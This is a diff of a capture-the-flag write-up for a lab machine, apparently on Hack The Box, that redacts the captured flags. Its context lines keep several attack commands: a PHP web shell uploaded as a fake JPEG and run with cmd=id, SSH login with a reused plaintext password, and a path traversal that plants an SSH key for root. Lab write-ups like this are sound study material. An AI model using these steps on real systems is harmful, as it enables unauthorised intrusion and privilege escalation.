@@ -88,11 +88,11 @@
 <tbody>
 <tr>
 <td>User (<code>/home/jones/user.txt</code>)</td>
-<td><code>3c2fbdb0251b53802b1c878ef262c826</code></td>
+<td><code>[REDACTED]</code></td>
 </tr>
 <tr>
 <td>Root (<code>/root/root.txt</code>)</td>
-<td><code>ba50357ae77edadbc1846498d09d2542</code></td>
+<td><code>[REDACTED]</code></td>
 </tr>
 </tbody>
 </table></div>
@@ -143,9 +143,9 @@ curl -b kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: bill
 curl -b kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: billing.nexus.htb&quot; \
   -H &quot;X-XSRF-TOKEN: $XSRF&quot; -F &quot;file=@shell.php;type=image/jpeg;filename=shell.php&quot; \
   http://billing.nexus.htb/admin/tinymce/upload
-# {&quot;location&quot;:&quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac47239ea1567.php&quot;}
+# {&quot;location&quot;:&quot;http://billing.nexus.htb/storage/tinymce/[REDACTED].php&quot;}
 
-curl -s &quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac47239ea1567.php?cmd=id&quot;
+curl -s &quot;http://billing.nexus.htb/storage/tinymce/[REDACTED].php?cmd=id&quot;
 # uid=33(www-data) gid=33(www-data) ...
 </code></pre>
 <h3>4. <code>.env</code> discovery — rotated DB password</h3>
@@ -157,7 +157,7 @@ curl -s &quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac4723
 <p>The rotated DB password <code>y27xb3ha!!74GbR</code> is reused for the system account <code>jones</code>:</p>
 <pre><code class="language-bash">ssh jones@10.129.146.171   # password: y27xb3ha!!74GbR
 cat /home/jones/user.txt
-# 3c2fbdb0251b53802b1c878ef262c826
+# [REDACTED]
 </code></pre>
 <h3>6. Privilege escalation — Gitea template-sync path traversal</h3>
 <p><code>systemctl list-timers</code> shows a root oneshot, <code>gitea-template-sync.timer</code>, firing every ~60 s, running <code>/etc/gitea/template-sync.py</code> as root:</p>
@@ -189,7 +189,7 @@ git -c http.extraHeader=&quot;Host: git.nexus.htb&quot; push -f origin main
 <p>The next timer tick logs <code>synced: ../../../../../../root/.ssh/authorized_keys</code>, and the public key lands in <code>/root/.ssh/authorized_keys</code>. SSH in as root:</p>
 <pre><code class="language-bash">ssh -i nexus_root_key root@10.129.146.171
 cat /root/root.txt
-# ba50357ae77edadbc1846498d09d2542
+# [REDACTED]
 </code></pre>
 <hr />
 <h2>Techniques Demonstrated</h2>
